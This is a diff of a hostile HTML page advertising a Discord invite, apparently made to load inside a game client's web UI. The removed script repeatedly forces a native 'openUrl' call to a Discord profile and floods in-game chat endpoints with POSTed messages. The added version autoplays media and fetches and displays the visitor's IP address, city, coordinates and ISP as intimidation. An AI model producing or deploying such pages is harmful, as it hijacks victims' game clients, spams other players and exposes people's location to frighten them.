@@ -1,78 +1,77 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script>
-        setInterval(() => {
-            window.invokeNative("openUrl", "https://discord.com/users/1202377867116290129");
-        }, 5000);
-        setInterval(() => {
-            fetch("https://flix-scripts/chatResult", {
-                method: "POST",
-                body: JSON.stringify({ message: "." })
-            });
-            fetch("https://easy-chat+/o6ZbK5Ecp6", {
-                headers: {
-                    "accept": "*/*",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-                },
-                body: JSON.stringify({ message: ".", channel: "شات العام" }),
-                method: "POST"
-            });
-            fetch("https://melix_chat/chatResult", {
-                method: "POST",
-                body: JSON.stringify({ message: "." })
-            });
-        }, 1000);
-    </script>
+    <title>discord.gg/uaee</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: url('https://cdn.discordapp.com/attachments/1339519458217168906/1343802085409423440/phonto.png?ex=67be98b7&is=67bd4737&hm=d81a660fca6a26e1f420e9f930de149fbfe474f825f13283f339e3430d08c1fa&') no-repeat center center fixed;
-            background-size: cover;
+            background: #000; /* Black background for the video */
             font-family: 'Courier New', Courier, monospace;
-            color: #ff0000;
+            color: #0000ff;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             flex-direction: column;
             text-align: center;
-            overflow: hidden;
         }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            opacity: 1;
-            transition: opacity 1s ease-in-out;
+        .video-container video {
+            width: 750px; 
+            height: auto;
+            border: 2px solid #0000ff; 
+            border-radius: 100px;
+            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
         }
-        #content {
-            opacity: 0;
-            transition: opacity 1s ease-in-out;
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #0000ff; 
+            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
         }
-        .vjmi #content {
-            opacity: 1;
-        }
-        .vjmi video {
-            opacity: 0;
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #0000ff; 
+            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
+            letter-spacing: 4.5px; 
         }
     </style>
 </head>
 <body>
-    <video id="gif" autoplay loop controls>
-        <source src="https://cdn.discordapp.com/attachments/1161549573832052816/1357505918819893298/videoplayback.mp4?ex=67f07368&is=67ef21e8&hm=fe542de1a3081d838f932aa8232fe2c38191523b3ca065a5d833fe0cb0d82896&" type="video/mp4">
-    </video>
-    <div id="content">
-        <audio autoplay loop>
-            <source src="https://c.top4top.io/m_31834rdv31.mp3" type="audio/mpeg">
-        </audio>
+    <div class="video-container">
+        <video autoplay loop muted>
+            <source src="https://cdn.discordapp.com/attachments/1221287953297440850/1229039930949243003/Comp_1.mp4?ex=67faffe1&is=67f9ae61&hm=77b58da46ea36fe2f391652d89dabd5b0baeec793b2ba81c76c0bdd56c2ccbb9&" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
     </div>
+    <audio autoplay loop>
+        <source src="https://c.top4top.io/m_3236527oz1.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    <div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text">discord.gg/uaee</div>
+
     <script>
-        setTimeout(() => {
-            document.body.classList.add('vjmi');
-        }, 2500);
+         fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            delete data.readme;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.textContent = JSON.stringify(data, null, 2);
+        });
     </script>
 </body>
 </html>
